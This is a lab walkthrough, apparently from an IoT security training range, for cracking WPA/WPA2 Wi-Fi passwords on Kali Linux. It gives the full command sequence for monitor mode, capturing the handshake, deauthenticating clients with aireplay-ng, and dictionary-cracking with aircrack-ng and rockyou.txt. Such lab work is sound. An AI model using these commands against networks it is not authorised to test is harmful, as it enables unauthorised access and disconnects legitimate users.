# WIFI WPA/WPA2 Cracking

# Access Level

External

# Type of Attack

WIFI Brute Force/Dictionary Attack

# Description

## WPA/WPA2 4 Way Handshake
![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/WIFI%20Cracking/image11.png?raw=true)

WPA2 has three main key types:

- Pairwise Master Key (PMK) - the shared passphrase
- Pairwise Transient Key (PTK) - a key used for securing communications with individual clients
- Group Temporal Key (GTK) - a key used for securing multicast traffic

The PTK is generated from the following data:

- Shared passphrase (PMK)

- A nonce value generated by the access point (ANonce)
- A nonce value generated by the client station (SNonce)
- Access point MAC address
- Client station MAC address

4 Way Handshake Steps:

1.  AP sends a nonce to the STA (ANonce). The client creates the PTK.
2. Client nonce (SNonce) to AP and a Message Integrity Code (MIC), and which includes the authentication.
3. The AP creates PTK and sends the GTK, along with a sequence number together and an MIC.
4. The client sends a confirmation to the AP.

If the attacker captures the PTK, ANonce, SNonce, AP MAC and client MAC values via network sniffing, they can then brute-force the PMK aka Passphrase.
PTK = PRF (PMK + Anonce + SNonce + Mac (AA)+ Mac (SA))

# How The Attack Works

## Monitor Mode

We will be putting the WIFI chipset into Monitor mode. Monitor mode allows the chipset to capture all traffic on a particular WIFI channel. While in Monitor mode, the chipset cannot â€˜traditionallyâ€™ connect to WIFI networks, but can sniff traffic and send frames.

## Capturing The Handshake

### What we need

We need a WIFI network with a Device currently connected to it. We will send Deauthentication Packets to the Device connected to our target network to force it to disconnect. When it reconnects to the network, we will be ready and waiting to capture the handshake.

After capturing the handshake, we will crack it using a Dictionary Attack. You can also brute force attack if you have sufficient processing power.

Brute force works best when you run Kali on Bare Metal so that it can use your graphics card (designed to crack much faster than a CPU.)

There is a new kind of attack recently discovered called a PMKID Attack. This attack does not require any clients connected to the wireless AP. 

# Tools

### Kali Linux

https://www.kali.org/
Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing. It is maintained and funded by Offensive Security.

### Aircrack-ng

https://www.aircrack-ng.org/
Aircrack-ng is a complete suite of tools to assess WiFi network security.

### Airmon-ng

https://www.aircrack-ng.org/doku.php?id=airmon-ng
This script can be used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status.

### Airgeddon - Not used but helpful for extending capabilities

https://github.com/v1s1t0r1sh3r3/airgeddon
This is a multi-use bash script for Linux systems to audit wireless networks.

### Hashcat

https://hashcat.net/hashcat/
Hashcat is a password recovery tool. 

# Steps

## SSH Into Raspberry Pi

SSH using the command line using a command similar to:

`ssh kali@ip-address-of-pi`

AKA, put in your own IP address

`ssh kali@192.168.1.20`

user:pass is kali:kali as default

Update your Kali installation:

`sudo apt update`
`sudo apt upgrade -y`

## Place WIFI chip into Monitor Mode

In this stage, we are bringing the interface down (AKA turning it off), setting it to Monitor mode, bringing it up, killing any processes that may interfere with the operation, and bringing it back up. Finally, we are using the iwconfig command to see all wireless devices on the network, and confirming that our chip has been changed to monitor mode.

`sudo iw dev`

`sudo ip link set wlan0 down`
`sudo iw wlan0 set monitor control`
`sudo ip link set wlan0 up`

`sudo airmon-ng`
`sudo airmon-ng check`
`sudo airmon-ng check kill`

`sudo airmon-ng start wlan0`
`sudo iwconfig`

If successful, we will now see a new WLAN interface called wlan0mon on the Raspberry Pi.

## See networks

We are trying to crack the Basketball network. 

`sudo airodump-ng wlan0mon`

**Note down the BSSID (AP MAC address) and CH(chanel) of desired network.**

**Press CTRL+C to exit from here**

## Isolate target network and find MAC of device connected to it

`sudo airodump-ng wlan0mon -d 42:5F:9A:87:81:F5`


In the top BSSID section, we see the Access Point MAC address and ESSID.

In the bottom BSSID section, we see the Device connected to the AP. The Device MAC address is listed under STATION and is the Laptop connected to our AP.

# Use airodum-ng to capture WPA2 4 way handshake

handshakedump is the file we write the dump to
 -c is channel
 --bssid is the MAC address of the router/wifi AP
The file dump will usually be dumped in the same folder you run the command from
Keep this command running while you deauthenticate the Client from the AP in a new window

`sudo airodump-ng -w handshakedump -c 1 --bssid 42:5F:9A:87:81:F5 wlan0mon`

## In a new window, deauthenticate/disconnect the Client/Station device from the network

open new window for this
we now send broadcast Deauth packets to the AP
`sudo aireplay-ng --deauth 0 -a 42:5F:9A:87:81:F5 wlan0mon`



You will see the Client/Station device, also known as the Laptop, disconnect from the network and reconnect.

Press CTRL+C to stop the Deauthentication attack

## Possible Wrong Channel Issue

â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali]
â””â”€# aireplay-ng --deauth 0 -c b8:e8:56:2d:91:3c -a  74:83:C2:C7:06:44 wlan0mon
19:09:30  Waiting for beacon frame (BSSID: 74:83:C2:C7:06:44) on channel 12
19:09:30  wlan0mon is on channel 12, but the AP uses channel 11
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali]
â””â”€# 

If you get this issue change to channel 11 with

`sudo airmon-ng start wlan0mon 11`

or

`sudo iwconfig wlan0mon channel 11`

## Confirm Handshake Capture


If the Deauthentication attack is successful, we will see the handshake captured here.

In the lower, Client section, we can also see in Notes we now have the EAPOL note, which is an authentication protocol and is related to our handshake capture. 

Using the Linux command 

`ls`

we can see the list of files in the current directory

Here we see all the files associated with the capture, including the one ending in .cap, which is our captured handshake.

## Cracking the captured handshake with Aircrack-ng

Unzip the rockyou.txt file
We will be using a text file called rockyou.txt. This contains the dictionary for our dictionary attack. Because text files are easily compressible, rockyou.txt is typically compressed to save space unless people need it.

`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

### Crack the handshake

We use the following command to crack the handshake

`sudo aircrack-ng /home/kali/handshakedump/handshakedump-01.cap -w /usr/share/wordlists/rockyou.txt`

Where:

/home/kali/handshakedump/handshakedump-01.cap

Is the location of your captured handshake, and,

-w /usr/share/wordlists/rockyou.txt

is the -w flag for wordlist, and the directory of the wordlist.

If you are ever confused about the full path of the directory you are in, use command â€˜pwdâ€™ to see the full path.

### The handshake is cracked!


We can see that the handshake was successfully cracked, and the password is â€˜basketballâ€™

We can also see that Aircrack-ng attempted 71 keys before finding this key, and going through the entire dictionary would take 1 hour 25 minutes.

To attempt a purely brute force attack, use the Airgeddon Suite or other products. If you set up hashcat on a bare metal build of Kali, you should be able to utilize the GPU for much faster brute force cracking.

# Video

add a video link here 
